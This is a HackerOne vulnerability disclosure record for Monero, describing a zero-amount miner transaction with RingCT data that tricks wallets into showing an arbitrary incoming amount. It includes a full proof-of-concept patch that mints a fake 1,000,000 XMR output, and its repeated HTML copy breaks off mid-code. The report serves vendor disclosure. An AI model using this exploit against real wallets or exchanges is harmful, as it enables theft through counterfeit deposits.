{"id":501585,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDE1ODU=","url":"https://hackerone.com/reports/501585","title":"Zero-amount miner TX + RingCT allows monero wallet to receive arbitrary amount of monero","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-02-25T20:14:12.249Z","submitted_at":"2019-02-25T20:14:12.249Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cutcoin","url":"/cutcoin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/LxfC9tNjvfH1jqTt3oQV2Ncw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7731,"url":"https://hackerone.com/monero","handle":"monero","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Monero","twitter_handle":"monero","website":"https://getmonero.org","about":" Monero: the secure, private, untraceable cryptocurrency"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-07-03T00:12:36.057Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-02T23:49:23.570Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\n\n**Summary:** \n\nBy mining a specially crafted block, that still passes daemon verification an attacker can create a miner transaction that appears to the wallet to include sum of XMR picked by the attacker. It is our belief that this can be exploited to steal money from exchanges.\n\n**Description:** \n\nI'm the lead developer of CUT coin (https://github.com/cutcoin/cutcoin), a coin based on Monero codebase. Our aim is to build a cryptonote coin with proof of stake consensus.  In order to achieve this we needed to deeply analize both block verification in daemon and get familiar with wallet code. This lead us to discovering a vulnerability in (mainly) the wallet, that allows an attacker to convince any cli wallet that it received transaction with amount chosen by the attacker, that is virtually any. It is our believe that this can be used to send such counterfeit XMR to an exchange, that will credit the attacker with the sait amount of XMR inside the exchange, which can be exchanged for other coins and withdrawn. However this was of course not attempted. It is our belief that the vulnerability can not be used to \"mint\" real, transactable monero out of thin air, at least without knowledge of private key of rct::H.\n\nThe vulnerability is not very hard to describe. According to current verification rules in the daemon, it is perfectly fine to have a zero amount in the miner transaction (besides the real, non-zero amount). It is also perfectly fine to have RCT signatures and they of course will not be checked. On the other hand, there is code in the wallet that basically says \"if the amount is zero, decode the amount from RCT\".\n\nSo to exploit the vulnerability an attacker will need to modify the daemon to create blocktemplates with zero amount in the miner tx, with a valid-enough RCT signatures so the amount will decode. The attacker will need to mine a block directly to an exchange wallet. Most exchanges identify their users by payment id. Including the said field in miner tx is not available functionality. While this seems to be trivial to implement, it was not attempted by us.\n\nObviously this issue can be resolved in both the daemon and the wallet.\n\nWe have verified that the vulnerability is exploitable against github master as of today, February 25th.\n\nWe have proof of concept code, that can be provided if needed.\n\nWe leave decision about disclosure and timeline of this issue entirely to you. We do not intend to disclose it at all, however we will appreciate credit when disclosed.\n\nA fix for this vulnerability was today published to our github as a part of a single huge commit and is unlikely to be noticed by anyone.\n\n\n## Releases Affected:\n\n  * current git master\n\n## Impact\n\nTricking an exchange that she has deposited a huge sum of XMR and therefore effectively stealing from the said exchange.","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003c/p\u003e\n\n\u003cp\u003eBy mining a specially crafted block, that still passes daemon verification an attacker can create a miner transaction that appears to the wallet to include sum of XMR picked by the attacker. It is our belief that this can be exploited to steal money from exchanges.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m the lead developer of CUT coin (\u003ca title=\"https://github.com/cutcoin/cutcoin\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcutcoin%2Fcutcoin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/cutcoin/cutcoin\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), a coin based on Monero codebase. Our aim is to build a cryptonote coin with proof of stake consensus.  In order to achieve this we needed to deeply analize both block verification in daemon and get familiar with wallet code. This lead us to discovering a vulnerability in (mainly) the wallet, that allows an attacker to convince any cli wallet that it received transaction with amount chosen by the attacker, that is virtually any. It is our believe that this can be used to send such counterfeit XMR to an exchange, that will credit the attacker with the sait amount of XMR inside the exchange, which can be exchanged for other coins and withdrawn. However this was of course not attempted. It is our belief that the vulnerability can not be used to \u0026quot;mint\u0026quot; real, transactable monero out of thin air, at least without knowledge of private key of rct::H.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability is not very hard to describe. According to current verification rules in the daemon, it is perfectly fine to have a zero amount in the miner transaction (besides the real, non-zero amount). It is also perfectly fine to have RCT signatures and they of course will not be checked. On the other hand, there is code in the wallet that basically says \u0026quot;if the amount is zero, decode the amount from RCT\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eSo to exploit the vulnerability an attacker will need to modify the daemon to create blocktemplates with zero amount in the miner tx, with a valid-enough RCT signatures so the amount will decode. The attacker will need to mine a block directly to an exchange wallet. Most exchanges identify their users by payment id. Including the said field in miner tx is not available functionality. While this seems to be trivial to implement, it was not attempted by us.\u003c/p\u003e\n\n\u003cp\u003eObviously this issue can be resolved in both the daemon and the wallet.\u003c/p\u003e\n\n\u003cp\u003eWe have verified that the vulnerability is exploitable against github master as of today, February 25th.\u003c/p\u003e\n\n\u003cp\u003eWe have proof of concept code, that can be provided if needed.\u003c/p\u003e\n\n\u003cp\u003eWe leave decision about disclosure and timeline of this issue entirely to you. We do not intend to disclose it at all, however we will appreciate credit when disclosed.\u003c/p\u003e\n\n\u003cp\u003eA fix for this vulnerability was today published to our github as a part of a single huge commit and is unlikely to be noticed by anyone.\u003c/p\u003e\n\n\u003ch2 id=\"releases-affected\"\u003eReleases Affected:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003ecurrent git master\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eTricking an exchange that she has deposited a huge sum of XMR and therefore effectively stealing from the said exchange.\u003c/p\u003e\n","weakness":{"id":72,"name":"Resource Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-08-01T23:49:23.642Z","allow_singular_disclosure_after":-44518821.06888527,"singular_disclosure_allowed":true,"vote_count":8,"voters":["tems","armansameer","tomas_savenas","xpx-hack","thecharlatan","anomalroil","barcovi","who-biz"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4211631,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @cutcoin, thank you for your report.\n\nI can see the related fix in https://github.com/cutcoin/cutcoin/commit/597a853da0f222521f67b111171d0ecc78b90679 but I think it would help if you provided more formal PoC, especially if something was missed. Once confirmed by @moneromooo, please paste an XMR address if you'd like to receive bounty reward.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/cutcoin\"\u003e@cutcoin\u003c/a\u003e, thank you for your report.\u003c/p\u003e\n\n\u003cp\u003eI can see the related fix in \u003ca title=\"https://github.com/cutcoin/cutcoin/commit/597a853da0f222521f67b111171d0ecc78b90679\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcutcoin%2Fcutcoin%2Fcommit%2F597a853da0f222521f67b111171d0ecc78b90679\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/cutcoin/cutcoin/commit/597a853da0f222521f67b111171d0ecc78b90679\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e but I think it would help if you provided more formal PoC, especially if something was missed. Once confirmed by \u003ca href=\"/moneromooo\"\u003e@moneromooo\u003c/a\u003e, please paste an XMR address if you\u0026#39;d like to receive bounty reward.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-25T22:20:01.809Z","updated_at":"2019-02-25T22:20:01.809Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4211762,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello,\n\nI below is the diff that you can apply to current master to reproduce the vulnerability.\n\nWe make no representation, that this code is the best nor elegant way to reproduce the issue. Quite contrary this is quick hack, that serves the purpose.\n\nPlease note that patch only affects generation of miner transaction and does not change in any way block verification. The patch also decreases difficulty to 1000, to make the reproduction cheap enough. It is expected that mainnet daemons do not accept blocks with such low difficulty.\n\nAfter applying the patch, restart the daemon, ideally disconnect from the network (one way to do that is to run with --add-exclusive-node X:port and run \"ban X\" in daemon console, where X is an IP address of a node).\n\nThen create a new wallet or open an already existing one. Run \"start_mining\" with proper parameters. Soon enough you will find a block and be credited with 1 000 000 XMR more than expected block reward.\n\nAlternatively, with your permission I can generate a wallet for testnet/stagenet (or even mainnet) and inject a block that generates fake XMR. I'll then provide keys for the wallet. However I advise against this action.\n\n```\ndiff --git a/src/cryptonote_basic/difficulty.cpp b/src/cryptonote_basic/difficulty.cpp\nindex 55e3e93..95800f1 100644\n--- a/src/cryptonote_basic/difficulty.cpp\n+++ b/src/cryptonote_basic/difficulty.cpp\n@@ -42,6 +42,8 @@\n #undef MONERO_DEFAULT_LOG_CATEGORY\n #define MONERO_DEFAULT_LOG_CATEGORY \"difficulty\"\n \n+#define SMALL\n+\n namespace cryptonote {\n \n   using std::size_t;\n@@ -127,6 +129,10 @@ namespace cryptonote {\n       cumulative_difficulties.resize(DIFFICULTY_WINDOW);\n     }\n \n+#ifdef SMALL\n+  return 1000;\n+#endif\n+\n \n     size_t length = timestamps.size();\n     assert(length == cumulative_difficulties.size());\ndiff --git a/src/cryptonote_core/cryptonote_tx_utils.cpp b/src/cryptonote_core/cryptonote_tx_utils.cpp\nindex 0a04e0d..15abed2 100644\n--- a/src/cryptonote_core/cryptonote_tx_utils.cpp\n+++ b/src/cryptonote_core/cryptonote_tx_utils.cpp\n@@ -42,6 +42,8 @@ using namespace epee;\n #include \"crypto/crypto.h\"\n #include \"crypto/hash.h\"\n #include \"ringct/rctSigs.h\"\n+#include \"ringct/rctTypes.h\"\n+#include \"ringct/bulletproofs.h\"\n #include \"multisig/multisig.h\"\n \n using namespace crypto;\n@@ -138,6 +140,34 @@ namespace cryptonote\n       CHECK_AND_ASSERT_MES(max_outs \u003e= out_amounts.size(), false, \"max_out exceeded\");\n     }\n \n+#define EXPLOIT\n+\n+#ifdef EXPLOIT\n+    std::vector\u003crct::key\u003e amount_keys;\n+    {\n+      crypto::key_derivation derivation = AUTO_VAL_INIT(derivation);;\n+      crypto::public_key out_eph_public_key = AUTO_VAL_INIT(out_eph_public_key);\n+      bool r = crypto::generate_key_derivation(miner_address.m_view_public_key, txkey.sec, derivation);\n+      CHECK_AND_ASSERT_MES(r, false, \"while creating outs: failed to generate_key_derivation(\" \u003c\u003c miner_address.m_view_public_key \u003c\u003c \", \" \u003c\u003c txkey.sec \u003c\u003c \")\");\n+\n+      r = crypto::derive_public_key(derivation, 0, miner_address.m_spend_public_key, out_eph_public_key);\n+      CHECK_AND_ASSERT_MES(r, false, \"while creating outs: failed to derive_public_key(\" \u003c\u003c derivation \u003c\u003c \", \" \u003c\u003c 0 \u003c\u003c \", \"\u003c\u003c miner_address.m_spend_public_key \u003c\u003c \")\");\n+\n+      txout_to_key tk;\n+      tk.key = out_eph_public_key;\n+\n+      tx_out out;\n+      out.amount = 0;\n+      out.target = tk;\n+      tx.vout.push_back(out);\n+\n+      crypto::secret_key scalar1;\n+      derivation_to_scalar(derivation, 0, scalar1);\n+      amount_keys.push_back(rct::sk2rct(scalar1));\n+    }\n+#endif\n+\n+\n     uint64_t summary_amounts = 0;\n     for (size_t no = 0; no \u003c out_amounts.size(); no++)\n     {\n@@ -146,7 +176,11 @@ namespace cryptonote\n       bool r = crypto::generate_key_derivation(miner_address.m_view_public_key, txkey.sec, derivation);\n       CHECK_AND_ASSERT_MES(r, false, \"while creating outs: failed to generate_key_derivation(\" \u003c\u003c miner_address.m_view_public_key \u003c\u003c \", \" \u003c\u003c txkey.sec \u003c\u003c \")\");\n \n+#ifdef EXPLOIT\n+      r = crypto::derive_public_key(derivation, no + 1, miner_address.m_spend_public_key, out_eph_public_key);\n+#else\n       r = crypto::derive_public_key(derivation, no, miner_address.m_spend_public_key, out_eph_public_key);\n+#endif\n       CHECK_AND_ASSERT_MES(r, false, \"while creating outs: failed to derive_public_key(\" \u003c\u003c derivation \u003c\u003c \", \" \u003c\u003c no \u003c\u003c \", \"\u003c\u003c miner_address.m_spend_public_key \u003c\u003c \")\");\n \n       txout_to_key tk;\n@@ -156,6 +190,12 @@ namespace cryptonote\n       summary_amounts += out.amount = out_amounts[no];\n       out.target = tk;\n       tx.vout.push_back(out);\n+\n+#ifdef EXPLOIT\n+      crypto::secret_key scalar1;\n+      derivation_to_scalar(derivation, no+1, scalar1);\n+      amount_keys.push_back(rct::sk2rct(scalar1));\n+#endif\n     }\n \n     CHECK_AND_ASSERT_MES(summary_amounts == block_reward, false, \"Failed to construct miner tx, summary_amounts = \" \u003c\u003c summary_amounts \u003c\u003c \" not equal block_reward = \" \u003c\u003c block_reward);\n@@ -171,6 +211,94 @@ namespace cryptonote\n \n     tx.invalidate_hashes();\n \n+#ifdef EXPLOIT\n+    {\n+\n+\n+      rct::keyV destinations;\n+      std::vector\u003cuint64_t\u003e outamounts;\n+\n+      destinations.push_back(rct::pk2rct(boost::get\u003ctxout_to_key\u003e(tx.vout[0].target).key));\n+      destinations.push_back(rct::pk2rct(boost::get\u003ctxout_to_key\u003e(tx.vout[1].target).key));\n+      outamounts.push_back(COIN*1000000);\n+      outamounts.push_back(tx.vout[1].amount);\n+\n+\n+      rct::rctSig rv;\n+      rv.type = rct::RCTTypeBulletproof;\n+      crypto::hash tx_prefix_hash;\n+      get_transaction_prefix_hash(tx, tx_prefix_hash);\n+      rv.message = rct::hash2rct(tx_prefix_hash);\n+\n+      rct::ctkeyV outSk;\n+      rv.outPk.resize(destinations.size());\n+      rv.ecdhInfo.resize(destinations.size());\n+      size_t i;\n+      outSk.resize(destinations.size());\n+      for (i = 0; i \u003c destinations.size(); i++) {\n+        rv.outPk[i].dest = rct::copy(destinations[i]);\n+      }\n+      rv.p.bulletproofs.clear();\n+            if (1)\n+            {\n+                rct::keyV C, masks;\n+                {\n+     //               rv.p.bulletproofs.push_back(rct::proveRangeBulletproof(C, masks, outamounts));\n+                    masks = rct::skvGen(outamounts.size());\n+                    rct::Bulletproof proof = rct::bulletproof_PROVE(outamounts, masks);\n+                    CHECK_AND_ASSERT_THROW_MES(proof.V.size() == outamounts.size(), \"V does not have the expected size\");\n+                    C = proof.V;\n+                    rv.p.bulletproofs.push_back(proof);\n+\n+                    CHECK_AND_ASSERT_THROW_MES(rct::verBulletproof(rv.p.bulletproofs.back()), \"verBulletproof failed on newly created proof\");\n+                }\n+                for (i = 0; i \u003c outamounts.size(); ++i)\n+                {\n+                    rv.outPk[i].mask = rct::scalarmult8(C[i]);\n+                    outSk[i].mask = masks[i];\n+                }\n+            }\n+       rct::key sumout = rct::zero();\n+\n+        for (i = 0; i \u003c outSk.size(); ++i)\n+        {\n+            sc_add(sumout.bytes, outSk[i].mask.bytes, sumout.bytes);\n+            //mask amount and mask\n+            rv.ecdhInfo[i].mask = rct::copy(outSk[i].mask);\n+            rv.ecdhInfo[i].amount = rct::d2h(outamounts[i]);\n+            rct::ecdhEncode(rv.ecdhInfo[i], amount_keys[i], false);\n+        }\n+      rv.txnFee=COIN/20;\n+\n+      std::vector\u003cuint64_t\u003e inamounts;\n+      inamounts.push_back(outamounts[0]+outamounts[1]+rv.txnFee);\n+\n+\n+        rct::keyV \u0026pseudoOuts = true ? rv.p.pseudoOuts : rv.pseudoOuts;\n+        pseudoOuts.resize(inamounts.size());\n+//        rv.p.MGs.resize(inamounts.size());\n+        rct::key sumpouts = rct::zero(); //sum pseudoOut masks\n+        rct::keyV a(inamounts.size());\n+        for (i = 0 ; i \u003c inamounts.size() - 1; i++) {\n+            skGen(a[i]);\n+            sc_add(sumpouts.bytes, a[i].bytes, sumpouts.bytes);\n+            genC(pseudoOuts[i], a[i], inamounts[i]);\n+        }\n+//        rv.mixRing = mixRing;\n+        sc_sub(a[i].bytes, sumout.bytes, sumpouts.bytes);\n+        rct::genC(pseudoOuts[i], a[i], inamounts[i]);\n+        DP(pseudoOuts[i]);\n+\n+      rv.p.MGs.push_back(rct::mgSig());\n+      rv.p.MGs[0].ss.push_back(rct::keyV());\n+      rv.p.MGs[0].ss[0].push_back(rct::key());\n+      rv.p.MGs[0].ss[0].push_back(rct::key());\n+      tx.rct_signatures = rv;\n+    }\n+#endif\n+\n+\n+\n     //LOG_PRINT(\"MINER_TX generated ok, block_reward=\" \u003c\u003c print_money(block_reward) \u003c\u003c \"(\"  \u003c\u003c print_money(block_reward - fee) \u003c\u003c \"+\" \u003c\u003c print_money(fee)\n     //  \u003c\u003c \"), current_block_size=\" \u003c\u003c current_block_size \u003c\u003c \", already_generated_coins=\" \u003c\u003c already_generated_coins \u003c\u003c \", tx_id=\" \u003c\u003c get_transaction_hash(tx), LOG_LEVEL_2);\n     return true;\ndiff --git a/src/ringct/rctSigs.h b/src/ringct/rctSigs.h\nindex 9227eab..0d0f946 100644\n--- a/src/ringct/rctSigs.h\n+++ b/src/ringct/rctSigs.h\n@@ -65,6 +65,10 @@ namespace hw {\n \n namespace rct {\n \n+    bool verBulletproof(const Bulletproof \u0026proof);\n+    bool verBulletproof(const std::vector\u003cconst Bulletproof*\u003e \u0026proofs);\n+    Bulletproof proveRangeBulletproof(keyV \u0026C, keyV \u0026masks, const std::vector\u003cuint64_t\u003e \u0026amounts);\n+\n     boroSig genBorromean(const key64 x, const key64 P1, const key64 P2, const bits indices);\n     bool verifyBorromean(const boroSig \u0026bb, const key64 P1, const key64 P2);\n```","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI below is the diff that you can apply to current master to reproduce the vulnerability.\u003c/p\u003e\n\n\u003cp\u003eWe make no representation, that this code is the best nor elegant way to reproduce the issue. Quite contrary this is quick hack, that serves the purpose.\u003c/p\u003e\n\n\u003cp\u003ePlease note that patch only affects generation of miner transaction and does not change in any way block verification. The patch also decreases difficulty to 1000, to make the reproduction cheap enough. It is expected that mainnet daemons do not accept blocks with such low difficulty.\u003c/p\u003e\n\n\u003cp\u003eAfter applying the patch, restart the daemon, ideally disconnect from the network (one way to do that is to run with --add-exclusive-node X:port and run \u0026quot;ban X\u0026quot; in daemon console, where X is an IP address of a node).\u003c/p\u003e\n\n\u003cp\u003eThen create a new wallet or open an already existing one. Run \u0026quot;start_mining\u0026quot; with proper parameters. Soon enough you will find a block and be credited with 1 000 000 XMR more than expected block reward.\u003c/p\u003e\n\n\u003cp\u003eAlternatively, with your permission I can generate a wallet for testnet/stagenet (or even mainnet) and inject a block that generates fake XMR. I\u0026#39;ll then provide keys for the wallet. However I advise against this action.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/src/cryptonote_basic/difficulty.cpp b/src/cryptonote_basic/difficulty.cpp\nindex 55e3e93..95800f1 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/cryptonote_basic/difficulty.cpp\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/cryptonote_basic/difficulty.cpp\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -42,6 +42,8 @@\u003c/span\u003e\n #undef MONERO_DEFAULT_LOG_CATEGORY\n #define MONERO_DEFAULT_LOG_CATEGORY \u0026quot;difficulty\u0026quot;\n\n+#define SMALL\n\u003cspan class=\"gi\"\u003e+\n\u003c/span\u003e namespace cryptonote {\n\n   using std::size_t;\n\u003cspan class=\"p\"\u003e@@ -127,6 +129,10 @@\u003c/span\u003e namespace cryptonote {\n       cumulative_difficulties.resize(DIFFICULTY_WINDOW);\n     }\n\n+#ifdef SMALL\n\u003cspan class=\"gi\"\u003e+  return 1000;\n+#endif\n+\n\u003c/span\u003e\n     size_t length = timestamps.size();\n     assert(length == cumulative_difficulties.size());\n\u003cspan class=\"gh\"\u003ediff --git a/src/cryptonote_core/cryptonote_tx_utils.cpp b/src/cryptonote_core/cryptonote_tx_utils.cpp\nindex 0a04e0d..15abed2 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/cryptonote_core/cryptonote_tx_utils.cpp\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/cryptonote_core/cryptonote_tx_utils.cpp\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -42,6 +42,8 @@\u003c/span\u003e using namespace epee;\n #include \u0026quot;crypto/crypto.h\u0026quot;\n #include \u0026quot;crypto/hash.h\u0026quot;\n #include \u0026quot;ringct/rctSigs.h\u0026quot;\n\u003cspan class=\"gi\"\u003e+#include \u0026quot;ringct/rctTypes.h\u0026quot;\n+#include \u0026quot;ringct/bulletproofs.h\u0026quot;\n\u003c/span\u003e #include \u0026quot;multisig/multisig.h\u0026quot;\n\n using namespace crypto;\n\u003cspan class=\"p\"\u003e@@ -138,6 +140,34 @@\u003c/span\u003e namespace cryptonote\n       CHECK_AND_ASSERT_MES(max_outs \u0026gt;= out_amounts.size(), false, \u0026quot;max_out exceeded\u0026quot;);\n     }\n\n+#define EXPLOIT\n\u003cspan class=\"gi\"\u003e+\n+#ifdef EXPLOIT\n+    std::vector\u0026lt;rct::key\u0026gt; amount_keys;\n+    {\n+      crypto::key_derivation derivation = AUTO_VAL_INIT(derivation);;\n+      crypto::public_key out_eph_public_key = AUTO_VAL_INIT(out_eph_public_key);\n+      bool r = crypto::generate_key_derivation(miner_address.m_view_public_key, txkey.sec, derivation);\n+      CHECK_AND_ASSERT_MES(r, false, \u0026quot;while creating outs: failed to generate_key_derivation(\u0026quot; \u0026lt;\u0026lt; miner_address.m_view_public_key \u0026lt;\u0026lt; \u0026quot;, \u0026quot; \u0026lt;\u0026lt; txkey.sec \u0026lt;\u0026lt; \u0026quot;)\u0026quot;);\n+\n+      r = crypto::derive_public_key(derivation, 0, miner_address.m_spend_public_key, out_eph_public_key);\n+      CHECK_AND_ASSERT_MES(r, false, \u0026quot;while creating outs: failed to derive_public_key(\u0026quot; \u0026lt;\u0026lt; derivation \u0026lt;\u0026lt; \u0026quot;, \u0026quot; \u0026lt;\u0026lt; 0 \u0026lt;\u0026lt; \u0026quot;, \u0026quot;\u0026lt;\u0026lt; miner_address.m_spend_public_key \u0026lt;\u0026lt; \u0026quot;)\u0026quot;);\n+\n+      txout_to_key tk;\n+      tk.key = out_eph_public_key;\n+\n+      tx_out out;\n+      out.amount = 0;\n+      out.target = tk;\n+      tx.vout.push_back(out);\n+\n+      crypto::secret_key scalar1;\n+      derivation_to_scalar(derivation, 0, scalar1);\n+      amount_keys.push_back(rct::sk2rct(scalar1));\n+    }\n+#endif\n+\n+\n\u003c/span\u003e     uint64_t summary_amounts = 0;\n     for (size_t no = 0; no \u0026lt; out_amounts.size(); no++)\n     {\n\u003cspan class=\"p\"\u003e@@ -146,7 +176,11 @@\u003c/span\u003e namespace cryptonote\n       bool r = crypto::generate_key_derivation(miner_address.m_view_public_key, txkey.sec, derivation);\n       CHECK_AND_ASSERT_MES(r, false, \u0026quot;while creating outs: failed to generate_key_derivation(\u0026quot; \u0026lt;\u0026lt; miner_address.m_view_public_key \u0026lt;\u0026lt; \u0026quot;, \u0026quot; \u0026lt;\u0026lt; txkey.sec \u0026lt;\u0026lt; \u0026quot;)\u0026quot;);\n\n+#ifdef EXPLOIT\n\u003cspan class=\"gi\"\u003e+      r = crypto::derive_public_key(derivation, no + 1, miner_address.m_spend_public_key, out_eph_public_key);\n+#else\n\u003c/span\u003e       r = crypto::derive_public_key(derivation, no, miner_address.m_spend_public_key, out_eph_public_key);\n\u003cspan class=\"gi\"\u003e+#endif\n\u003c/span\u003e       CHECK_AND_ASSERT_MES(r, false, \u0026quot;while creating outs: failed to derive_public_key(\u0026quot; \u0026lt;\u0026lt; derivation \u0026lt;\u0026lt; \u0026quot;, \u0026quot; \u0026lt;\u0026lt; no \u0026lt;\u0026lt; \u0026quot;, \u0026quot;\u0026lt;\u0026lt; miner_address.m_spend_public_key \u0026lt;\u0026lt; \u0026quot;)\u0026quot;);\n\n       txout_to_key tk;\n\u003cspan class=\"p\"\u003e@@ -156,6 +190,12 @@\u003c/span\u003e namespace cryptonote\n       summary_amounts += out.amount = out_amounts[no];\n       out.target = tk;\n       tx.vout.push_back(out);\n\u003cspan class=\"gi\"\u003e+\n+#ifdef EXPLOIT\n+      crypto::secret_key scalar1;\n+      derivation_to_scalar(derivation, no+1, scalar1);\n+      amount_keys.push_back(rct::sk2rct(scalar1));\n+#endif\n\u003c/span\u003e     }\n\n     CHECK_AND_ASSERT_MES(summary_amounts == block_reward, false, \u0026quot;Failed to construct miner tx, summary_amounts = \u0026quot; \u0026lt;\u0026lt; summary_amounts \u0026lt;\u0026lt; \u0026quot; not equal block_reward = \u0026quot; \u0026lt;\u0026lt; block_reward);\n\u003cspan class=\"p\"\u003e@@ -171,6 +211,94 @@\u003c/span\u003e namespace cryptonote\n\n     tx.invalidate_hashes();\n\n+#ifdef EXPLOIT\n\u003cspan class=\"gi\"\u003e+    {\n+\n+\n+      rct::keyV destinations;\n+      std::vector\u0026lt;uint64_t\u0026gt; outamounts;\n+\n+      destinations.push_back(rct::pk2rct(boost::get\u0026lt;txout_to_key\u0026gt;(tx.vout[0].target).key));\n+      destinations.push_back(rct::pk2rct(boost::get\u0026lt;txout_to_key\u0026gt;(tx.vout[1].target).key));\n+      outamounts.push_back(COIN*1000000);\n+      outamounts.push_back(tx.vout[1].amount);\n+\n+\n+      rct::rctSig rv;\n+      rv.type = rct::RCTTypeBulletproof;\n+      crypto::hash tx_prefix_hash;\n+      get_transaction_prefix_hash(tx, tx_prefix_hash);\n+      rv.message = rct::hash2rct(tx_prefix_hash);\n+\n+      rct::ctkeyV outSk;\n+      rv.outPk.resize(destinations.size());\n+      rv.ecdhInfo.resize(destinations.size());\n+      size_t i;\n+      outSk.resize(destinations.size());\n+      for (i = 0; i \u0026lt; destinations.size(); i++) {\n+        rv.outPk[i].dest = rct::copy(destinations[i]);\n+      }\n+      rv.p.bulletproofs.clear();\n+            if (1)\n+            {\n+                rct::keyV C, masks;\n+                {\n+     //               rv.p.bulletproofs.push_back(rct::proveRangeBulletproof(C, masks, outamounts));\n+                    masks = rct::skvGen(outamounts.size());\n+                    rct::Bulletproof proof = rct::bulletproof_PROVE(outamounts, masks);\n+                    CHECK_AND_ASSERT_THROW_MES(proof.V.size() == outamounts.size(), \u0026quot;V does not have the expected size\u0026quot;);\n+                    C = proof.V;\n+                    rv.p.bulletproofs.push_back(proof);\n+\n+                    CHECK_AND_ASSERT_THROW_MES(rct::verBulletproof(rv.p.bulletproofs.back()), \u0026quot;verBulletproof failed on newly created proof\u0026quot;);\n+                }\n+                for (i = 0; i \u0026lt; outamounts.size(); ++i)\n+                {\n+                    rv.outPk[i].mask = rct::scalarmult8(C[i]);\n+                    outSk[i].mask = masks[i];\n+                }\n+            }\n+       rct::key sumout = rct::zero();\n+\n+        for (i = 0; i \u0026lt; outSk.size(); ++i)\n+        {\n+            sc_add(sumout.bytes, outSk[i].mask.bytes, sumout.bytes);\n+            //mask amount and mask\n+            rv.ecdhInfo[i].mask = rct::copy(outSk[i].mask);\n+            rv.ecdhInfo[i].amount = rct::d2h(outamounts[i]);\n+            rct::ecdhEncode(rv.ecdhInfo[i], amount_keys[i], false);\n+        }\n+      rv.txnFee=COIN/20;\n+\n+      std::vector\u0026lt;uint64_t\u0026gt; inamounts;\n+      inamounts.push_back(outamounts[0]+outamounts[1]+rv.txnFee);\n+\n+\n+        rct::keyV \u0026amp;pseudoOuts = true ? rv.p.pseudoOuts : rv.pseudoOuts;\n+        